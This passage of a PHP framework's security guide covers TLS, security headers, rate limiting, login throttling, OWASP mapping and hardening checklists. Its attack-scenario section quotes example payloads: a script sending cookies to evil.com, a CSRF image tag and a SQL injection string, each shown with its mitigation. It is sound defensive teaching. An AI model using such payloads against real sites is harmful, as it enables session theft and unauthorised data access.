APP_URL=https://yourdomain.com
SESSION_SECURE=true
COOKIE_SECURE=true
```

**Nginx Configuration**:

```nginx
server {
    listen 443 ssl http2;
    server_name yourdomain.com;

    ssl_certificate /etc/letsencrypt/live/yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;

    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;

    # HSTS (force HTTPS for 1 year)
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

    # ... rest of config
}

# Redirect HTTP to HTTPS
server {
    listen 80;
    server_name yourdomain.com;
    return 301 https://$server_name$request_uri;
}
```

---

## Security Headers

### HTTP Security Headers

**Implementation**:

```php
// SecurityHeadersMiddleware.php
class SecurityHeadersMiddleware implements MiddlewareInterface
{
    public function handle(Request $request, Closure $next): Response
    {
        $response = $next($request);

        // X-Frame-Options (clickjacking protection)
        $response->header('X-Frame-Options', 'DENY');

        // X-Content-Type-Options (MIME sniffing protection)
        $response->header('X-Content-Type-Options', 'nosniff');

        // X-XSS-Protection (legacy XSS protection)
        $response->header('X-XSS-Protection', '1; mode=block');

        // Referrer-Policy (control referrer information)
        $response->header('Referrer-Policy', 'strict-origin-when-cross-origin');

        // Permissions-Policy (control browser features)
        $response->header('Permissions-Policy',
            'geolocation=(), microphone=(), camera=()'
        );

        // Content-Security-Policy (XSS/injection protection)
        $response->header('Content-Security-Policy',
            "default-src 'self'; " .
            "script-src 'self' 'unsafe-inline' https://cdn.example.com; " .
            "style-src 'self' 'unsafe-inline'; " .
            "img-src 'self' data: https:; " .
            "font-src 'self' data:; " .
            "connect-src 'self'; " .
            "frame-ancestors 'none';"
        );

        // Strict-Transport-Security (HSTS - HTTPS enforcement)
        if (config('app.env') === 'production') {
            $response->header('Strict-Transport-Security',
                'max-age=31536000; includeSubDomains; preload'
            );
        }

        return $response;
    }
}
```

### Header Explanations

**X-Frame-Options**:
- Prevents clickjacking attacks
- Values: `DENY` (no framing), `SAMEORIGIN` (same origin only)

**X-Content-Type-Options**:
- Prevents MIME sniffing
- Forces browser to respect declared Content-Type

**X-XSS-Protection**:
- Legacy XSS filter (modern browsers use CSP)
- `1; mode=block` enables and blocks on detection

**Referrer-Policy**:
- Controls what referrer information is sent
- `strict-origin-when-cross-origin`: Full URL for same-origin, origin only for cross-origin

**Content-Security-Policy (CSP)**:
- Most powerful security header
- Defines trusted sources for content
- Prevents XSS, injection attacks

**Strict-Transport-Security (HSTS)**:
- Forces HTTPS for specified duration
- `includeSubDomains`: Apply to all subdomains
- `preload`: Submit to HSTS preload list

---

## Rate Limiting & DoS Protection

### Rate Limiting Implementation

**Features**:
- Per-IP and per-user limits
- Configurable time windows
- Response headers (X-RateLimit-*)
- 429 status code with Retry-After header

**Implementation**: See [DEV-SECURITY.md](/docs/md/DEV-SECURITY.md)

#### RateLimiter Class

```php
// RateLimiter.php
class RateLimiter
{
    protected CacheManager $cache;

    public function tooManyAttempts(string $key, int $maxAttempts): bool
    {
        if ($this->attempts($key) >= $maxAttempts) {
            if ($this->cache->has($this->timeoutKey($key))) {
                return true;
            }
            $this->resetAttempts($key);
        }

        return false;
    }

    public function hit(string $key, int $decayMinutes = 1): int
    {
        $cacheKey = $this->key($key);

        // Set timeout
        $this->cache->put(
            $this->timeoutKey($key),
            time() + ($decayMinutes * 60),
            $decayMinutes * 60
        );

        // Increment attempts
        $attempts = (int) $this->cache->get($cacheKey, 0) + 1;
        $this->cache->put($cacheKey, $attempts, $decayMinutes * 60);

        return $attempts;
    }

    public function attempts(string $key): int
    {
        return (int) $this->cache->get($this->key($key), 0);
    }

    public function resetAttempts(string $key): void
    {
        $this->cache->forget($this->key($key));
        $this->cache->forget($this->timeoutKey($key));
    }

    protected function key(string $key): string
    {
        return 'rate_limit:' . $key;
    }

    protected function timeoutKey(string $key): string
    {
        return $this->key($key) . ':timeout';
    }
}
```

#### Throttle Middleware

```php
// ThrottleMiddleware.php
class ThrottleMiddleware implements MiddlewareInterface
{
    public function handle(Request $request, Closure $next, int $maxAttempts = 60, int $decayMinutes = 1): Response
    {
        $rateLimiter = app('rate.limiter');

        // Generate unique key (IP or user-based)
        $key = $this->resolveRequestSignature($request);

        // Check rate limit
        if ($rateLimiter->tooManyAttempts($key, $maxAttempts)) {
            return $this->buildLimitExceededResponse($key, $maxAttempts);
        }

        // Increment counter
        $rateLimiter->hit($key, $decayMinutes);

        $response = $next($request);

        // Add rate limit headers
        return $this->addHeaders($response, $maxAttempts, $rateLimiter->attempts($key));
    }

    protected function resolveRequestSignature(Request $request): string
    {
        if ($user = auth()->user()) {
            return 'user:' . $user->id;
        }

        return 'ip:' . $request->ip();
    }

    protected function addHeaders(Response $response, int $maxAttempts, int $attempts): Response
    {
        $response->header('X-RateLimit-Limit', $maxAttempts);
        $response->header('X-RateLimit-Remaining', max(0, $maxAttempts - $attempts));

        return $response;
    }

    protected function buildLimitExceededResponse(string $key, int $maxAttempts): Response
    {
        $retryAfter = app('rate.limiter')->availableIn($key);

        $response = JsonResponse::error('Too many requests. Please try again later.', 429);
        $response->header('Retry-After', $retryAfter);
        $response->header('X-RateLimit-Limit', $maxAttempts);
        $response->header('X-RateLimit-Remaining', 0);

        return $response;
    }
}
```

#### Usage

```php
// routes/api.php

// 60 requests per minute (default)
Router::group(['middleware' => [ThrottleMiddleware::class . ':60,1']], function () {
    Router::get('/api/products', [ProductController::class, 'index']);
});

// 5 requests per minute (strict, for login)
Router::group(['middleware' => [ThrottleMiddleware::class . ':5,1']], function () {
    Router::post('/login', [AuthController::class, 'login']);
});

// 200 requests per 5 minutes
Router::group(['middleware' => [ThrottleMiddleware::class . ':200,5']], function () {
    Router::get('/api/search', [SearchController::class, 'index']);
});
```

### DoS Protection Strategies

**1. IP-based Rate Limiting**
- Limit requests per IP address
- Prevents single-source attacks

**2. User-based Rate Limiting**
- Limit requests per authenticated user
- Prevents credential stuffing

**3. Endpoint-specific Limits**
- Different limits for different endpoints
- Expensive operations (search, reports) have stricter limits

**4. Progressive Delays**
```php
// Increase delay for repeated violations
$violations = cache()->get("violations:{$ip}", 0);
if ($violations > 0) {
    sleep(min($violations, 10));  // Max 10 second delay
}
```

**5. CAPTCHA for Suspicious Activity**
```php
if ($rateLimiter->tooManyAttempts($key, 10)) {
    return view('captcha-challenge');
}
```

---

## Account Lockout & Brute Force Protection

### Login Throttle System

**Implementation**: See [AUTH-LOCKOUT.md](/docs/md/AUTH-LOCKOUT.md)

**Features**:
- IP + Email combination tracking
- Configurable max attempts and decay period
- Automatic expiry
- Successful login clears attempts

#### LoginThrottle Class

```php
// LoginThrottle.php
class LoginThrottle
{
    protected CacheManager $cache;
    protected array $config;

    public function __construct(CacheManager $cache, array $config)
    {
        $this->cache = $cache;
        $this->config = $config;
    }

    public function tooManyAttempts(string $key): bool
    {
        if (!$this->isEnabled()) {
            return false;
        }

        return $this->attempts($key) >= $this->getMaxAttempts();
    }

    public function hit(string $key): int
    {
        $cacheKey = $this->resolveKey($key);
        $attempts = (int) $this->cache->get($cacheKey, 0) + 1;

        $this->cache->put($cacheKey, $attempts, $this->getDecayMinutes() * 60);

        return $attempts;
    }

    public function attempts(string $key): int
    {
        return (int) $this->cache->get($this->resolveKey($key), 0);
    }

    public function clear(string $key): void
    {
        $this->cache->forget($this->resolveKey($key));
    }

    public static function key(string $ip, string $username): string
    {
        return 'login_throttle:' . sha1($ip . '|' . mb_strtolower($username));
    }

    protected function resolveKey(string $key): string
    {
        return 'login_throttle:' . $key;
    }

    protected function isEnabled(): bool
    {
        return $this->config['enabled'] ?? true;
    }

    protected function getMaxAttempts(): int
    {
        return $this->config['max_attempts'] ?? 5;
    }

    protected function getDecayMinutes(): int
    {
        return $this->config['decay_minutes'] ?? 15;
    }
}
```

#### Integration with Auth

```php
// Auth.php
public function attempt(array $credentials, bool $remember = false): bool
{
    $email = $credentials['email'] ?? '';
    $password = $credentials['password'] ?? '';

    // Check login throttle
    if ($this->loginThrottle) {
        $throttleKey = LoginThrottle::key($this->getIpAddress(), $email);

        if ($this->loginThrottle->tooManyAttempts($throttleKey)) {
            throw AuthenticationException::accountLocked(
                $this->loginThrottle->lockoutSeconds($throttleKey)
            );
        }
    }

    // Find user
    $user = $this->provider->retrieveByCredentials($credentials);

    if (!$user || !$this->verifyPassword($user, $password)) {
        // Increment failed attempts
        if ($this->loginThrottle) {
            $this->loginThrottle->hit($throttleKey);
        }

        return false;
    }

    // Clear throttle on success
    if ($this->loginThrottle) {
        $this->loginThrottle->clear($throttleKey);
    }

    // Login user
    $this->login($user, $remember);

    return true;
}
```

### Configuration

```env
# .env
AUTH_THROTTLE_ENABLED=true
AUTH_THROTTLE_MAX_ATTEMPTS=5
AUTH_THROTTLE_DECAY_MINUTES=15
```

```php
// config/auth.php
return [
    'login_throttle' => [
        'enabled' => env('AUTH_THROTTLE_ENABLED', true),
        'max_attempts' => env('AUTH_THROTTLE_MAX_ATTEMPTS', 5),
        'decay_minutes' => env('AUTH_THROTTLE_DECAY_MINUTES', 15),
    ],
];
```

---

## Threat Models & OWASP Top 10

### OWASP Top 10 Coverage

| # | Threat | Mitigation | Framework Implementation |
|---|--------|------------|-------------------------|
| A01:2021 | **Broken Access Control** | Authentication, authorization, RBAC | Auth system, middleware, context permissions |
| A02:2021 | **Cryptographic Failures** | Strong encryption, HTTPS, secure storage | AES-256-CBC, TLS, session encryption |
| A03:2021 | **Injection** | Parameterized queries, input validation | Query builder, validation, sanitization |
| A04:2021 | **Insecure Design** | Threat modeling, security by design | Defense-in-depth, least privilege, fail secure |
| A05:2021 | **Security Misconfiguration** | Secure defaults, hardening guides | Default security enabled, configuration docs |
| A06:2021 | **Vulnerable Components** | Regular updates, dependency scanning | Minimal dependencies, security advisories |
| A07:2021 | **Authentication Failures** | Strong passwords, MFA, account lockout | Argon2ID, login throttle, session security |
| A08:2021 | **Software/Data Integrity** | Code signing, CI/CD security | HMAC validation, signature verification |
| A09:2021 | **Security Logging Failures** | Comprehensive logging, monitoring | Activity logs, security event logging |
| A10:2021 | **Server-Side Request Forgery** | URL validation, allow lists | Input validation, SSRF prevention helpers |

### Attack Scenarios & Mitigations

#### Scenario 1: Brute Force Attack

**Attack**:
```
Attacker tries 1000 passwords per minute
for user admin@example.com
from IP 203.0.113.55
```

**Mitigations**:
1. Login throttle (5 attempts per 15 minutes)
2. Rate limiting (60 requests per minute)
3. CAPTCHA after 3 failed attempts
4. Email notification on suspicious activity

**Result**: Attack slowed to 5 attempts per 15 minutes = 80 minutes for 1000 passwords

#### Scenario 2: Session Hijacking

**Attack**:
```
Attacker intercepts session cookie via:
- XSS attack
- Network sniffing (HTTP)
- Malware on victim's device
```

**Mitigations**:
1. HTTPS only (TLS encryption)
2. HTTP-only cookies (no JavaScript access)
3. Secure flag (HTTPS only)
4. Session regeneration on login
5. User-agent validation
6. IP address validation (optional)

**Result**: Cookie protected from common interception methods

#### Scenario 3: CSRF Attack

**Attack**:
```html
<!-- Malicious site -->
<img src="https://yourdomain.com/account/transfer?to=attacker&amount=10000">
```

**Mitigations**:
1. CSRF tokens on all state-changing requests
2. SameSite cookies (lax/strict)
3. Referer validation
4. Custom request headers (X-Requested-With)

**Result**: Request blocked due to missing/invalid CSRF token

#### Scenario 4: SQL Injection

**Attack**:
```
Input: admin@example.com' OR '1'='1
Query: SELECT * FROM users WHERE email = 'admin@example.com' OR '1'='1'
Result: Returns all users
```

**Mitigations**:
1. Parameterized queries (always)
2. Input validation (type checking)
3. Whitelist for column/table names
4. ORM/Query Builder usage

**Result**: Input treated as literal string, query returns 0 results

#### Scenario 5: XSS Attack

**Attack**:
```html
Comment: <script>fetch('https://evil.com?cookie=' + document.cookie)</script>
```

**Mitigations**:
1. Output escaping (e() helper)
2. Content-Security-Policy header
3. HTTP-only cookies
4. Input validation/sanitization

**Result**: Script displayed as text, doesn't execute

#### Scenario 6: Man-in-the-Middle (MITM)

**Attack**:
```
Attacker intercepts HTTP traffic
Reads plaintext passwords, session cookies
```

**Mitigations**:
1. HTTPS/TLS encryption
2. HSTS header (force HTTPS)
3. Secure cookies
4. Certificate pinning (mobile apps)

**Result**: Traffic encrypted, attacker sees ciphertext only

#### Scenario 7: Credential Stuffing

**Attack**:
```
Attacker has 1 million email:password pairs from other breaches
Tests them against your site
```

**Mitigations**:
1. Rate limiting (IP-based)
2. Login throttle (email-based)
3. CAPTCHA after failures
4. Unusual activity detection
5. 2FA/MFA

**Result**: Attack slowed to unusable rate

#### Scenario 8: JWT Token Theft

**Attack**:
```
Attacker steals JWT token from:
- localStorage (XSS)
- Network traffic (HTTP)
- Browser history/logs
```

**Mitigations**:
1. HTTPS only
2. Short expiration (15-60 minutes)
3. Token blacklisting
4. Refresh token rotation
5. Don't store in localStorage (use HTTP-only cookies)

**Result**: Token expires quickly, can be revoked

---

## Security Configuration

### Environment Configuration

```env
# .env (Production)

# Application
APP_ENV=production
APP_DEBUG=false
APP_URL=https://yourdomain.com
APP_KEY=base64:YourRandomKeyHere==

# CSRF Protection
CSRF_ENABLED=true

# JWT Authentication
JWT_SECRET=YourJWTSecretKeyMinimum32Characters
JWT_TTL=3600
JWT_ALGORITHM=HS256

# Session Security
SESSION_DRIVER=database
SESSION_LIFETIME=120
SESSION_COOKIE=so_session
SESSION_SECURE=true
SESSION_HTTP_ONLY=true
SESSION_SAME_SITE=lax
SESSION_ENCRYPT=true

# Rate Limiting
RATE_LIMIT_ENABLED=true
RATE_LIMIT_DEFAULT=60,1

# Login Throttle
AUTH_THROTTLE_ENABLED=true
AUTH_THROTTLE_MAX_ATTEMPTS=5
AUTH_THROTTLE_DECAY_MINUTES=15

# Database
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=your_database
DB_USERNAME=your_username
DB_PASSWORD=your_secure_password

# Cache (for rate limiting, sessions)
CACHE_DRIVER=database

# Logging
LOG_CHANNEL=stack
LOG_LEVEL=warning
```

### Security Config File

```php
// config/security.php
<?php

return [
    // CSRF Protection
    'csrf' => [
        'enabled' => env('CSRF_ENABLED', true),
        'except' => [
            'api/*',          // API routes (use JWT instead)
            'webhooks/*',     // Webhook callbacks
            'internal-api/*', // Internal API (signature auth)
        ],
    ],

    // JWT Authentication
    'jwt' => [
        'secret' => env('JWT_SECRET'),
        'ttl' => env('JWT_TTL', 3600),
        'algorithm' => env('JWT_ALGORITHM', 'HS256'),
        'blacklist_enabled' => true,
        'blacklist_grace_period' => 10,
    ],

    // Rate Limiting
    'rate_limit' => [
        'enabled' => env('RATE_LIMIT_ENABLED', true),
        'default' => env('RATE_LIMIT_DEFAULT', '60,1'),
    ],
];
```

### Session Config

```php
// config/session.php
<?php

return [
    'driver' => env('SESSION_DRIVER', 'database'),
    'lifetime' => env('SESSION_LIFETIME', 120),
    'table' => 'sessions',
    'lottery' => [2, 100],

    // Cookie configuration
    'cookie' => env('SESSION_COOKIE', 'so_session'),
    'secure' => env('SESSION_SECURE', false),
    'http_only' => true,
    'same_site' => 'lax',

    // Encryption
    'encrypt' => env('SESSION_ENCRYPT', false),
];
```

### CORS Config

```php
// config/cors.php
<?php

return [
    'allowed_origins' => [
        'https://app.example.com',
        'https://admin.example.com',
        // Wildcard subdomains
        'https://*.example.com',
    ],

    'allowed_methods' => 'GET,POST,PUT,DELETE,PATCH,OPTIONS',

    'allowed_headers' => 'Content-Type,Authorization,X-CSRF-TOKEN,X-Requested-With',

    'exposed_headers' => 'X-RateLimit-Limit,X-RateLimit-Remaining,Retry-After',

    'allow_credentials' => false,

    'max_age' => '86400',
];
```

---

## Best Practices

### 1. Password Security

- Use Argon2ID or bcrypt for hashing
- Minimum 8 characters, recommend 12+
- Require uppercase, lowercase, number, special character
- Implement password strength meter
- Never log passwords (even hashed)
- Implement password history (prevent reuse)

```php
// Validation
$validated = validate($request->all(), [
    'password' => 'required|min:12|regex:/[A-Z]/|regex:/[a-z]/|regex:/[0-9]/|regex:/[@$!%*?&]/',
]);
```

### 2. Session Security

- Use database sessions for horizontal scaling
- Enable session encryption for sensitive data
- Set short session lifetime (2 hours)
- Regenerate session ID on login
- Implement idle timeout
- Use HTTP-only, Secure, SameSite cookies

### 3. API Security

- Always use HTTPS in production
- Implement rate limiting (60-100 req/min)
- Use short-lived JWT tokens (15-60 minutes)
- Implement refresh token mechanism
- Validate all inputs
- Log all authentication events

### 4. Input Validation

- Validate on server-side (never trust client)
- Whitelist allowed values when possible
- Type-check all inputs
- Sanitize before storage
- Escape before output

### 5. Error Handling

- Don't expose stack traces in production
- Return generic error messages
- Log detailed errors server-side
- Implement custom error pages

```php
// Good
return JsonResponse::error('An error occurred', 500);

// Bad
return JsonResponse::error('SQL error: Table users not found in /var/www/...', 500);
```

### 6. Logging & Monitoring

- Log all security events (login, logout, permission changes)
- Monitor failed login attempts
- Alert on suspicious patterns
- Implement log rotation
- Use separate security log channel

```php
logger()->channel('security')->info('User logged in', [
    'user_id' => auth()->id(),
    'ip' => request()->ip(),
    'user_agent' => request()->userAgent(),
]);
```

### 7. Dependency Management

- Keep dependencies updated
- Review security advisories
- Use Composer for dependency management
- Minimize third-party dependencies
- Audit dependencies regularly

### 8. Code Review & Testing

- Peer review security-critical code
- Write security tests
- Perform penetration testing
- Use static analysis tools
- Regular security audits

---

## Security Checklist

### Pre-Production Checklist

**Configuration**:
- [ ] `APP_DEBUG=false` in production
- [ ] Strong `APP_KEY` generated (32+ bytes)
- [ ] Strong `JWT_SECRET` generated (32+ characters)
- [ ] HTTPS enabled (`SESSION_SECURE=true`)
- [ ] CSRF protection enabled
- [ ] Rate limiting enabled
- [ ] Session encryption enabled (if storing sensitive data)

**Authentication**:
- [ ] Password hashing uses Argon2ID or bcrypt
- [ ] Login throttle configured (max 5 attempts)
- [ ] Session lifetime appropriate (120 minutes)
- [ ] Remember me tokens hashed before storage
- [ ] Account lockout implemented

**Authorization**:
- [ ] Role-based access control implemented
- [ ] Permission checks on all protected routes
- [ ] Context-aware permissions configured

**Input/Output Security**:
- [ ] All user input validated
- [ ] All output escaped (e() helper)
- [ ] Parameterized queries used (no string concatenation)
- [ ] File upload validation implemented

**Session Security**:
- [ ] Database sessions configured
- [ ] Session regeneration on login
- [ ] HTTP-only cookies enabled
- [ ] Secure flag enabled (HTTPS)
- [ ] SameSite attribute set (lax/strict)

**API Security**:
- [ ] JWT tokens have expiration
- [ ] Token blacklisting implemented
- [ ] API rate limiting configured
- [ ] CORS configured correctly

**Headers**:
- [ ] Security headers configured (X-Frame-Options, CSP, etc.)
- [ ] HSTS header enabled (HTTPS)
- [ ] X-Content-Type-Options set

**Encryption**:
- [ ] TLS/HTTPS configured
- [ ] Database credentials encrypted
- [ ] API keys encrypted at rest
- [ ] Session payloads encrypted (if needed)

**Logging & Monitoring**:
- [ ] Security events logged
- [ ] Failed login attempts logged
- [ ] Error logging configured
- [ ] Log files protected (not web-accessible)

**Infrastructure**:
- [ ] Firewall configured
- [ ] SSH keys used (no password auth)
- [ ] Database access restricted
- [ ] Unnecessary services disabled

### Post-Deployment Checklist

- [ ] Security headers verified (securityheaders.com)
- [ ] SSL/TLS configuration tested (ssllabs.com)
- [ ] Penetration testing performed
- [ ] Vulnerability scanning completed
- [ ] Backup and recovery tested
- [ ] Incident response plan documented
- [ ] Security monitoring configured

---

## Additional Resources

### Framework Documentation

- [DEV-SECURITY.md](/docs/md/DEV-SECURITY.md) - CSRF, Rate Limiting, CORS
- [SECURITY-LAYER.md](/docs/md/SECURITY-LAYER.md) - Security overview
- [AUTH-SYSTEM.md](/docs/md/AUTH-SYSTEM.md) - Authentication
- [SESSION-SYSTEM.md](/docs/md/SESSION-SYSTEM.md) - Session management
- [SESSION-ENCRYPTION.md](/docs/md/SESSION-ENCRYPTION.md) - Session encryption
- [AUTH-LOCKOUT.md](/docs/md/AUTH-LOCKOUT.md) - Account lockout
- [DEV-API-AUTH.md](/docs/md/DEV-API-AUTH.md) - API authentication
- [ENCRYPTER.md](/docs/md/ENCRYPTER.md) - Encryption utilities
- [PASSWORD-RESET.md](/docs/md/PASSWORD-RESET.md) - Password reset

### External Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [PCI DSS](https://www.pcisecuritystandards.org/)
- [GDPR Compliance](https://gdpr.eu/)
- [HIPAA Security Rule](https://www.hhs.gov/hipaa/for-professionals/security/)

---

**Documentation Version**: 2.0
**Last Updated**: 2026-02-01
**Maintained By**: SO Backend Framework Security Team
**Status**: Production Ready
